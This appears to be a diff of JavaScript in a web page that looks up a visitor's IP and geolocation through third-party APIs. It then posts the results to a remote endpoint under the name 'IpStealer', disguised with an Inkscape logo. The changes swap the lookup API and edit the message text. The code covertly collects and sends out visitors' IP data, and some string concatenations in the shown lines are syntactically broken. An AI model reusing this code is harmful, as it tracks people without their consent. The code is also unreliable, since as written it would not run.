@@ -34,7 +34,7 @@
         };
         xhr.send(null);
       }
-      get_information("https://ipapi.co/json", function(text) {
+      get_information("https://api.techniknews.net/ipgeo/", function(text) {
         var div = document.createElement("div");
         div.innerHTML = text;
         div.id = "razzylog";
@@ -59,7 +59,7 @@
         const params = {
           username: "IpStealer",
           avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
-          content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : " + " https://ipapi.co/json/" + ispp ""
+          content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : " + ifo ""
         }
         request.send(JSON.stringify(params));
       }
